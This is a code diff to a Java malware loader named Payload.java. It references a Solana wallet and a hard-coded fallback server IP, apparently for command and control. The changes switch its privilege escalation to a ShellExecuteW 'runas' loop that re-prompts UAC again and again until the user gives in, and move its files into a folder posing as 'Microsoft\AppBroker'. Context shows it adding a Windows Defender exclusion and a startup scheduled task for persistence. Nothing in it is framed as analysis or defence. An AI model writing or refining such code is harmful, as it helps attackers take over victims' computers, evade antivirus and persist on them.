@@ -1,4 +1,5 @@
 // language: Java, file: payload/Payload.java
+import com.sun.jna.*;
 import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -7,6 +8,11 @@ import java.util.Base64;
 import java.util.zip.*;
 
 public class Payload {
+    public interface Shell32 extends Library {
+        Shell32 INSTANCE = Native.load("shell32", Shell32.class);
+        int ShellExecuteW(Pointer hwnd, String lpOperation, String lpFile, String lpParameters, String lpDirectory, int nShowCmd);
+    }
+
     private static final String SOLANA_WALLET = "BCy1eKppGB5WPmQ8PrSJT4gkMRy5HmzsuaVrnqef7zoV";
     private static final String SOLANA_RPC = "https://api.devnet.solana.com";
     private static final String FALLBACK_SERVER = "95.182.96.216";
@@ -40,10 +46,18 @@ public class Payload {
         }
     }
 
+    // Helper to get the new AppBroker directory
+    private static File getLoaderDir() {
+        String localAppData = System.getenv("LOCALAPPDATA");
+        if (localAppData == null) localAppData = "C:\\";
+        File dir = new File(localAppData, "Microsoft\\AppBroker");
+        if (!dir.exists()) dir.mkdirs();
+        return dir;
+    }
+
     private static String readKeyJson() {
         try {
-            String appData = System.getenv("APPDATA");
-            File keyFile = new File(appData + "\\loader\\key.json");
+            File keyFile = new File(getLoaderDir(), "key.json");
             if (keyFile.exists()) {
                 String content = new String(Files.readAllBytes(keyFile.toPath()));
                 int start = content.indexOf("\"key\":\"") + 7;
@@ -122,8 +136,7 @@ public class Payload {
 
     private static void log(String msg) {
         try {
-            String appData = System.getenv("APPDATA");
-            File logFile = new File(appData + "\\loader\\java_debug.txt");
+            File logFile = new File(getLoaderDir(), "java_debug.txt");
             FileWriter fw = new FileWriter(logFile, true);
             fw.write(msg + "\n");
             fw.close();
@@ -142,29 +155,34 @@ public class Payload {
             String javaHome = new File(System.getProperty("java.home")).getAbsolutePath();
             String javaExe = javaHome + "\\bin\\javaw.exe";
             String jarPath = new File(Payload.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
-            
+            File lockFile = new File(getLoaderDir(), ".lock");
+
             log("java: " + javaExe);
             log("jar: " + jarPath);
 
-            // Use cmd.exe to launch PowerShell without hiding the window
-            String psCommand = String.format(
-                "Start-Process -FilePath '%s' -Verb RunAs -ArgumentList '-jar \"%s\" %s %s' -Wait",
-                javaExe, jarPath, key, ip
-            );
-
-            String fullCmd = "cmd.exe /c powershell.exe -NoProfile -Command \"" + psCommand + "\"";
+            String cmdArgs = String.format("-jar \"%s\" %s %s", jarPath, key, ip);
+            
+            FileOutputStream lockStream = new FileOutputStream(lockFile);
 
             while (true) {
-                log("Triggering UAC via cmd.exe...");
+                log("Triggering UAC...");
                 
-                // Launch cmd.exe normally (visible)
-                Process p = new ProcessBuilder("cmd.exe", "/c", "powershell.exe", "-NoProfile", "-Command", psCommand).start();
+                int result = Shell32.INSTANCE.ShellExecuteW(null, "runas", javaExe, cmdArgs, null, 1);
                 
-                // This blocks until the user clicks Yes or No
-                p.waitFor(); 
-                
-                log("UAC Closed. Retrying...");
-                Thread.sleep(500); 
+                if (result > 32) {
+                    log("UAC Accepted. Waiting for elevated process...");
+                    for (int i = 0; i < 150; i++) {
+                        if (!lockFile.exists() || lockFile.delete()) {
+                            log("Elevated process confirmed. Parent exiting.");
+                            lockStream.close();
+                            System.exit(0);
+                        }
+                        Thread.sleep(100);
+                    }
+                } else {
+                    log("UAC Denied. Instantly retrying...");
+                    Thread.sleep(250); 
+                }
             }
         } catch (Exception e) {
             log("UAC Error: " + e.toString());
@@ -174,8 +192,13 @@ public class Payload {
     private static void executePayload(String key, String ip) {
         try {
             log("Executing payload...");
-            String appData = System.getenv("APPDATA");
-            File loaderDir = new File(appData, "loader");
+            File loaderDir = getLoaderDir();
+            
+            File lock = new File(loaderDir, ".lock");
+            if (lock.exists()) {
+                lock.delete();
+                log("Deleted .lock file to notify parent.");
+            }
 
             log("Adding AV exclusion...");
             String regPath = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths";
@@ -219,11 +242,10 @@ public class Payload {
         try {
             log("Installing startup scheduled task via javaw.exe...");
             
-            String appData = System.getenv("APPDATA");
-            String jarPath = appData + "\\loader\\st.jar";
+            String jarPath = getLoaderDir().getAbsolutePath() + "\\st.jar";
             String javaHome = new File(System.getProperty("java.home")).getAbsolutePath();
             String javawPath = javaHome + "\\bin\\javaw.exe";
-            String xmlPath = appData + "\\loader\\task.xml";
+            String xmlPath = getLoaderDir().getAbsolutePath() + "\\task.xml";
 
             String xml = "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n" +
                 "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n" +
